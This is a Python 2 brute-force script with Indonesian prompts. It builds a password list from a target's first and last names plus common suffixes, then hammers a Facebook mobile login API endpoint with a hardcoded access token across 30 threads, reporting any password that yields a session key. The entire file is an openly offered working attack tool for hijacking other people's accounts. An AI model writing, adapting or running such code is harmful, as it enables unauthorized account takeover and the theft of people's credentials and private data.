# -*- coding UTF-8 -*-
#  Author : Iqbal Dev
#  Tools : Geli2 Efbeh
#  Versi : 0.3

from prettytable import PrettyTable
from multiprocessing.pool import Process, ThreadPool
from useragents import user_agents, string1, string2
import os, sys, time, requests, json

s = '\n  \033[92;1m         Suksess... \n        Password Found '
multi_dev = []
sandi = []
def Wordlist():

	try:
		print string1
		print "\033[96;1m        B U A T   W O R D L I $ T "
		print '\033[92;1m+'+'-'*38+'+' 
		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Depan Target\033[93;1m : ")
		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Belakang Target\033[93;1m : ")
		if nama1 == '' or nama2 == '':
			sys.exit("\n\033[91;1m Jangan Kosong dong Sayang!\n Kamu Keluar...")
		d = nama1.replace(' ', '').replace('  ', '')
		b = nama2.replace(' ', '').replace('  ', '')
		lis = ['123','12345','321']
		# ////////////////////////////////////////////
		for dev in lis:
			sandi.append(nama1+dev)
		for dev in lis:
			sandi.append(nama2+dev)
		sandi.append('sayang')
		sandi.append('anjing')
	except KeyboardInterrupt:

		print "\n Keluar.... "

	print " \n\033[92;1m   Suksess Membuat Wordlist..."
		


def target():
	global target

	# os.system('cls' if os.name == 'nt' else 'clear')
	print string2
	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Username Target:\n\033[93;1m  => \033[97;1m ")
	print '+'+'-'*38+'+'
	pasw = open('user.txt', 'w')
	pasw.write(user)
	pasw.close() 
	

def br_dev1(paswq):
	usr = open('user.txt', 'r').read()
	wak = time.ctime()
	pas = paswq.replace('\n', '')
	print '\033[96;1m ' + wak + " \033[95;1m" + pas 

	dev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+usr+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
	dev_id = dev.content
	jsl = json.loads(dev_id)
	if "session_key" in dev_id or "www.facebook.com" in jsl["error_msg"]:
	  try:
		x = PrettyTable()
		print s
		x.add_column("\033[92;1mUsername\033[97;1m", ['\033[96;1m'+usr+'\033[97;1m'])
		x.add_column("\033[92;1mPassword\033[97;1m", ['\033[96;1m'+pas+'\033[97;1m'])
		print '\033[97;1m'
		print x
		raw_input('\n\033[96;1m  Selamat Anda Sedang Beruntung :)\n Tekan CTRL Z Untuk Berhenti...\n')
	  except:
	  	pass

	
	

def brute():
	Wordlist()
	target()
	dev = ThreadPool(30)
	dev.map(br_dev1, sandi)

	print '\n\033[92;1m    Selesai Broo..... \n'


